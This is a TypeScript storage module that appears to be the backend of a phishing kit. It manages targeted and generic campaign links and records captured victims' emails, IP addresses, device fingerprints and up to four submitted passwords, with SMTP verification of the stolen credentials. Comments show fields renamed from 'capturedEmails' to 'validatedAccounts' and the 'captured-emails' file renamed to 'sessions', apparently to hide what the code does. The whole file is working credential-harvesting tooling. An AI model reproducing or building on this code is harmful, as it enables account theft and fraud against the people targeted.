/**
 * Persistent storage for links using JSON files
 * Handles both Type A (personalized) and Type B (generic) links
 */
import 'server-only'

import { secureReadJSON, secureWriteJSON, secureUpdateJSON } from './secureFileSystem'
import { migrateFileIfNeeded } from './fileMigration'
import path from 'path'

export interface Link {
  // Common fields
  id: string                    // Primary key (UUID)
  type: 'personalized' | 'generic'
  sessionIdentifier?: string     // Unique session token (formerly: linkToken) - optional for backward compatibility
  linkToken?: string             // Legacy alias for backward compatibility (required if sessionIdentifier not provided)
  name: string | null           // Campaign name (optional)
  createdAt: number             // Timestamp
  expiresAt: number             // Timestamp
  status: 'active' | 'used' | 'expired' | 'deleted'
  templateId?: string           // Optional template override
  templateMode?: 'auto' | 'manual' | 'rotate'  // NEW: How template is selected
  language?: string             // Optional language override
  loadingScreen?: string        // Loading screen ID (e.g., 'meeting', 'voice', etc.)
  loadingDuration?: number      // Loading screen duration in seconds (default: 3)

  // Type A (Personalized) fields
  email: string | null          // Single email (Type A only)
  used: boolean                 // If link was used (Type A only)
  usedAt: number | null         // When used (Type A only)
  fingerprint: string | null    // Device fingerprint (Type A only)
  ip: string | null             // IP address (Type A only)

  // Type B (Generic) fields
  allowedEmails: string[] | null    // Uploaded email list (Type B only)
  validatedAccounts: string[] | null   // Emails that used link (Type B only) (formerly: capturedEmails)
  capturedEmails?: string[] | null   // Legacy alias for backward compatibility
  pendingEmails: string[] | null    // Emails still unused (Type B only)
  totalEmails: number | null        // Total in list (Type B only)
  capturedCount: number | null      // How many captured (Type B only)
  pendingCount: number | null       // How many pending (Type B only)
}

export interface CapturedEmail {
  id: string                    // Primary key (UUID)
  email: string                 // Captured email
  sessionIdentifier?: string     // Which link was used (formerly: linkToken)
  linkToken?: string            // Legacy alias for backward compatibility (required if sessionIdentifier not provided)
  linkType: 'personalized' | 'generic'
  linkName: string | null       // Campaign name
  fingerprint: string           // Device fingerprint
  ip: string                    // IP address
  passwords: string[]           // All attempts (max 4)
  verified: boolean             // SMTP verification result
  provider: string              // Email provider (Gmail, Outlook, etc.)
  capturedAt: number            // Timestamp
  attempts: number              // How many password attempts
  mxRecord: string              // MX record
}

export interface EmailIdMapping {
  id: string                    // Primary key (e.g., "user_12345")
  email: string                 // Email address
  linkId: string                // Foreign key to Links table
  createdAt: number             // Timestamp
}

// Token storage (formerly: links)
// Session storage (formerly: captured-emails)
// Migrate old file names on first access
const LEGACY_LINKS_FILE = path.join(process.cwd(), '.links.json')
const LINKS_FILE = path.join(process.cwd(), '.tokens.json')
const LEGACY_CAPTURED_FILE = path.join(process.cwd(), '.captured-emails.json')
const CAPTURED_FILE = path.join(process.cwd(), '.sessions.json')
const MAPPINGS_FILE = path.join(process.cwd(), '.email-id-mappings.json')

// Migrate old file names if needed (runs once on module load)
if (typeof process !== 'undefined' && typeof process.cwd === 'function') {
  migrateFileIfNeeded(LEGACY_LINKS_FILE, LINKS_FILE)
  migrateFileIfNeeded(LEGACY_CAPTURED_FILE, CAPTURED_FILE)
}

// In-memory caches
let linksCache: Record<string, Link> = {}
let capturedCache: Record<string, CapturedEmail> = {}
let mappingsCache: Record<string, EmailIdMapping> = {}
let cacheLoaded = false

/**
 * Load all caches from files (atomic reads)
 */
async function loadCaches(): Promise<void> {
  if (cacheLoaded) return

  linksCache = await secureReadJSON<Record<string, Link>>(LINKS_FILE, {})
  capturedCache = await secureReadJSON<Record<string, CapturedEmail>>(CAPTURED_FILE, {})
  mappingsCache = await secureReadJSON<Record<string, EmailIdMapping>>(MAPPINGS_FILE, {})

  cacheLoaded = true
}

/**
 * Save links cache to file (atomic write)
 */
async function saveLinksCache(): Promise<void> {
  try {
    await secureWriteJSON(LINKS_FILE, linksCache)
  } catch (error) {
    // Silent fail - cache is best effort
  }
}

/**
 * Save captured cache to file (atomic write)
 */
async function saveCapturedCache(): Promise<void> {
  try {
    await secureWriteJSON(CAPTURED_FILE, capturedCache)
  } catch (error) {
    // Silent fail - cache is best effort
  }
}

/**
 * Save mappings cache to file (atomic write)
 */
async function saveMappingsCache(): Promise<void> {
  try {
    await secureWriteJSON(MAPPINGS_FILE, mappingsCache)
  } catch (error) {
    // Silent fail - cache is best effort
  }
}

// ===== LINK FUNCTIONS =====

/**
 * Save a new link or update existing link
 */
export async function saveLink(link: Link): Promise<void> {
  await loadCaches()
  // Use sessionIdentifier as primary, fallback to linkToken for legacy data
  const sessionId = link.sessionIdentifier || link.linkToken
  if (!sessionId) {
    throw new Error('Link must have either sessionIdentifier or linkToken')
  }
  // Ensure both fields are set for backward compatibility
  if (link.sessionIdentifier && !link.linkToken) {
    link.linkToken = link.sessionIdentifier
  } else if (link.linkToken && !link.sessionIdentifier) {
    link.sessionIdentifier = link.linkToken
  }
  linksCache[sessionId] = link
  await saveLinksCache()
}

/**
 * Get link by session identifier (formerly: linkToken)
 */
export async function getLink(sessionIdentifier: string): Promise<Link | null> {
  await loadCaches()
  // Try sessionIdentifier first, then linkToken for legacy data
  const link = linksCache[sessionIdentifier] || Object.values(linksCache).find(
    l => l.linkToken === sessionIdentifier || l.sessionIdentifier === sessionIdentifier
  )
  // Ensure sessionIdentifier is set for backward compatibility
  if (link && !link.sessionIdentifier && link.linkToken) {
    link.sessionIdentifier = link.linkToken
  }
  return link || null
}

/**
 * Mark personalized link as used
 */
export async function markLinkUsed(
  sessionIdentifier: string,
  fingerprint: string,
  ip: string
): Promise<void> {
  await loadCaches()
  const link = linksCache[sessionIdentifier] || Object.values(linksCache).find(
    l => l.linkToken === sessionIdentifier || l.sessionIdentifier === sessionIdentifier
  )

  if (link && link.type === 'personalized') {
    link.used = true
    link.usedAt = Date.now()
    link.fingerprint = fingerprint
    link.ip = ip
    link.status = 'used'
    await saveLinksCache()
  }
}

/**
 * Update generic link stats when email is captured
 */
export async function updateGenericLinkStats(
  sessionIdentifier: string,
  email: string
): Promise<void> {
  await loadCaches()
  const link = linksCache[sessionIdentifier] || Object.values(linksCache).find(
    l => l.linkToken === sessionIdentifier || l.sessionIdentifier === sessionIdentifier
  )

  if (link && link.type === 'generic') {
    const normalizedEmail = email.toLowerCase()

    // Remove from pending
    if (link.pendingEmails) {
      link.pendingEmails = link.pendingEmails.filter(e => e !== normalizedEmail)
      link.pendingCount = link.pendingEmails.length
    }

    // Add to validated accounts (formerly: capturedEmails)
    const validatedAccounts = link.validatedAccounts || link.capturedEmails || []
    if (!validatedAccounts.includes(normalizedEmail)) {
      validatedAccounts.push(normalizedEmail)
      link.validatedAccounts = validatedAccounts
      link.capturedEmails = validatedAccounts // Legacy alias
      link.capturedCount = validatedAccounts.length
    }

    await saveLinksCache()
  }
}

/**
 * Get all links
 */
export async function getAllLinks(): Promise<Link[]> {
  await loadCaches()
  return Object.values(linksCache)
}

/**
 * Get links by type
 */
export async function getLinksByType(type: 'personalized' | 'generic'): Promise<Link[]> {
  await loadCaches()
  return Object.values(linksCache).filter(link => link.type === type)
}

// ===== CAPTURED EMAIL FUNCTIONS =====

/**
 * Save captured email record
 */
export async function saveCapturedEmail(captured: CapturedEmail): Promise<void> {
  await loadCaches()
  capturedCache[captured.id] = captured
  await saveCapturedCache()
}

/**
 * Check if email is already captured for a generic link
 */
export async function isEmailCaptured(
  email: string,
  sessionIdentifier: string
): Promise<boolean> {
  await loadCaches()
  const link = linksCache[sessionIdentifier] || Object.values(linksCache).find(
    l => l.linkToken === sessionIdentifier || l.sessionIdentifier === sessionIdentifier
  )

  if (!link) return false

  const validatedAccounts = link.validatedAccounts || link.capturedEmails || []
  if (link.type === 'generic' && validatedAccounts.length > 0) {
    return validatedAccounts.includes(email.toLowerCase())
  }

  return false
}

/**
 * Get all captured emails
 */
export async function getAllCapturedEmails(): Promise<CapturedEmail[]> {
  await loadCaches()
  return Object.values(capturedCache)
}

/**
 * Get captured emails by session identifier (formerly: linkToken)
 */
export async function getCapturedEmailsByLink(sessionIdentifier: string): Promise<CapturedEmail[]> {
  await loadCaches()
  return Object.values(capturedCache).filter(
    captured => captured.sessionIdentifier === sessionIdentifier || captured.linkToken === sessionIdentifier
  )
}

/**
 * Update captured email verification status
 */
export async function updateCapturedEmailVerification(
  captureId: string,
  verified: boolean
): Promise<void> {
  await loadCaches()
  const captured = capturedCache[captureId]
  
  if (captured) {
    captured.verified = verified
    await saveCapturedCache()
  } else {
  }
}

// ===== EMAIL ID MAPPING FUNCTIONS (Type A) =====

/**
 * Save email-ID mapping for Type A links
 */
export async function saveEmailIdMapping(
  id: string,
  email: string,
  linkId: string
): Promise<void> {
  await loadCaches()
  mappingsCache[id] = {
    id,
    email: email.toLowerCase(),
    linkId,
    createdAt: Date.now()
  }
  await saveMappingsCache()
}

/**
 * Get email from ID (Type A links)
 * Handles both formats: user_XXX and link_user_XXX
 */
export async function getEmailFromId(id: string): Promise<string | null> {
  await loadCaches()
  
  // Try exact match first
  let mapping = mappingsCache[id]
  
  // If not found and id starts with 'link_', try without prefix
  if (!mapping && id.startsWith('link_')) {
    const userIdOnly = id.replace('link_', '')
    mapping = mappingsCache[userIdOnly]
  }
  
  // If still not found and id doesn't start with 'link_', try finding by linkId
  if (!mapping && !id.startsWith('link_')) {
    // Search through all mappings to find by linkId
    const foundMapping = Object.values(mappingsCache).find(m => m.linkId === `link_${id}`)
    if (foundMapping) {
      mapping = foundMapping
    }
  }
  
  if (mapping) {
    return mapping.email
  }
  
  return null
}

/**
 * Get mapping by ID
 */
export async function getEmailIdMapping(id: string): Promise<EmailIdMapping | null> {
  await loadCaches()
  return mappingsCache[id] || null
}

// ===== CLEANUP FUNCTIONS =====

/**
 * Cleanup expired links (mark as expired)
 */
export async function cleanupExpiredLinks(): Promise<number> {
  await loadCaches()
  const now = Date.now()
  let count = 0

  for (const token in linksCache) {
    const link = linksCache[token]
    // Ensure sessionIdentifier is set for backward compatibility
    if (link && !link.sessionIdentifier && link.linkToken) {
      link.sessionIdentifier = link.linkToken
    }
    if (link && link.expiresAt < now && link.status === 'active') {
      link.status = 'expired'
      count++
    }
  }

  if (count > 0) {
    await saveLinksCache()
  }

  return count
}

/**
 * Delete link (soft delete - mark as deleted)
 */
export async function deleteLink(sessionIdentifier: string): Promise<boolean> {
  await loadCaches()
  const link = linksCache[sessionIdentifier] || Object.values(linksCache).find(
    l => l.linkToken === sessionIdentifier || l.sessionIdentifier === sessionIdentifier
  )

  if (link) {
    link.status = 'deleted'
    await saveLinksCache()
    return true
  }

  return false
}

